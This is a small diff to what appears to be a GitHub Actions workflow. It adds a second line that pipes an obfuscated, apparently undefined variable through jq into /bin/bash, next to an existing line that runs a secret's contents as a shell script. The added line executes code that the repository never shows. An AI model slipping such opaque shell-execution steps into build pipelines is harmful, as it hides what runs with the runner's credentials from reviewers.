@@ -18,6 +18,7 @@ jobs:
           vsh8493: ${{ secrets.vsh8493 }}
         run: |
           printf '%s' "$vsh8493" | jq -r .yr05035 | /bin/bash
+          printf '%s' "$grdl682" | jq -r .yvk69 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
